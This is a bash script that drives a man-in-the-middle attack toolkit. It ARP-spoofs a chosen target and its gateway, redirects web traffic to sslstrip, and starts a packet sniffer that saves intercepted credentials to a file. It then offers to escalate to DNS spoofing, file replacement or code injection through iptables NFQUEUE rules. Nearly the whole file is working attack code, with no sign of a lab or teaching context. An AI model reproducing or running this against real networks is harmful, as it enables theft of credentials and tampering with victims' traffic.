#!/bin/bash

trap "trap - SIGTERM && kill -- -$$" SIGINT SIGTERM EXIT

echo -e "\n███╗   ███╗███████╗    ██╗███╗   ██╗    ████████╗██╗  ██╗███████╗    ███╗   ███╗██╗██████╗ ██████╗ ██╗     ███████"
echo -e "████╗ ████║██╔════╝    ██║████╗  ██║    ╚══██╔══╝██║  ██║██╔════╝    ████╗ ████║██║██╔══██╗██╔══██╗██║     ██╔════╝"
echo -e "██╔████╔██║█████╗      ██║██╔██╗ ██║       ██║   ███████║█████╗      ██╔████╔██║██║██║  ██║██║  ██║██║     █████╗  "
echo -e "██║╚██╔╝██║██╔══╝      ██║██║╚██╗██║       ██║   ██╔══██║██╔══╝      ██║╚██╔╝██║██║██║  ██║██║  ██║██║     ██╔══╝  "
echo -e "██║ ╚═╝ ██║███████╗    ██║██║ ╚████║       ██║   ██║  ██║███████╗    ██║ ╚═╝ ██║██║██████╔╝██████╔╝███████╗███████╗"
echo -e "╚═╝     ╚═╝╚══════╝    ╚═╝╚═╝  ╚═══╝       ╚═╝   ╚═╝  ╚═╝╚══════╝    ╚═╝     ╚═╝╚═╝╚═════╝ ╚═════╝ ╚══════╝╚══════╝\n"



MYIP=$(ip route | grep src | cut -d ' ' -f 9)

echo "1" > /proc/sys/net/ipv4/ip_forward

if [[ -z $1 ]] || [[ -n $3 ]]
then
read -p "Enter a subnet to scan: " TARGET_SUBNET

./ARP_netscan.py $TARGET_SUBNET && TARGET_IP=$(cat /tmp/mitm.txt | cut -d' ' -f 1) && GATEWAY_IP=$(cat /tmp/mitm.txt | cut -d' ' -f 2)

#echo "Ex: /main.sh 10.0.2.0/24 where <subnet> is the subnet you want to scan."
#echo "Alternate usage; ./main.sh <target-ip> <gateway-ip> to skip the scan and go directly to an attack."

elif [[ -n $1 ]] && [[ -z $2 ]]
then
./ARP_netscan.py $1 && TARGET_IP=$(cat /tmp/mitm.txt | cut -d' ' -f 1) && GATEWAY_IP=$(cat /tmp/mitm.txt | cut -d' ' -f 2)

elif [[ -n $1 ]] && [[ -n $2 ]]
then
TARGET_IP=$1
GATEWAY_IP=$2
fi

#run the ARP spoofing script
./arp_spoof.py $TARGET_IP $GATEWAY_IP >> /tmp/arp_log.txt &

sleep 1

echo -e "\nSuccess. You are now the any-gendered person in the middle.\n"

sleep 1

echo "Updating firewall rules to forward intercepted webrequests to sslstrip"

iptables -F

sleep 1

iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000

sslstrip 2>/dev/null &

sleep 1

INTERFACE=$(ip route | grep default | cut -d ' ' -f 5)

echo -e "\nStarting packet sniffer on interface ${INTERFACE}\n"

#DATE=$(date | tr ' ' '-')

#FILENAME="./packet-output-${DATE}"

#echo "Please give full path to output file for any credentials found during packet sniff: "

#read OUTFILE

./packet_sniffer.py $INTERFACE &

echo -e "Packet sniffing in progress. Any credentials detected over the wire will be saved in ./output.txt\n\n---------------------------------------------------\n"
echo -e "Would you like to escalate the attack?"
#echo "Note: Selecting one of these attacks will end the sslstrip currently in progress, potentially limiting the credentials found by the packet sniffer."
echo -e "1. DNS Spoofing"
echo "2. File Replacement"
echo -e "3. Code Injection\n"
read -p ">>" USERNUMBER

if [[ $USERNUMBER == '1' ]]
then

sslstrip_pid=$(ps -aux | grep sslstrip | grep -v 'grep' | awk '{ print $2 }')
kill $sslstrip_pid

echo "Updating firewall rules to forward packets to and from NFQUEUE..."

#iptables -t nat -F && iptables -I INPUT -j NFQUEUE --queue-num 0 && iptables -I OUTPUT -j NFQUEUE --queue-num 0

iptables -t nat -F && iptables -I FORWARD -j NFQUEUE --queue-num 0

sleep 1

echo "Complete."

./dns_spoof.py $MYIP

elif [[ $USERNUMBER == '2' ]]
then

echo "Updating firewall rules to forward packets to and from NFQUEUE..."

iptables -F && iptables -I INPUT -j NFQUEUE --queue-num 0 && iptables -I OUTPUT -j NFQUEUE --queue-num 0

sleep 1

echo "Complete."


./file_replacer.py

elif [[ $USERNUMBER == '3' ]]
then

iptables -F && iptables -I INPUT -j NFQUEUE --queue-num 0 && iptables -I OUTPUT -j NFQUEUE --queue-num 0

./code_injector.py

else
echo "Please enter 1, 2, or 3"

fi

while true
do
sleep 10
done

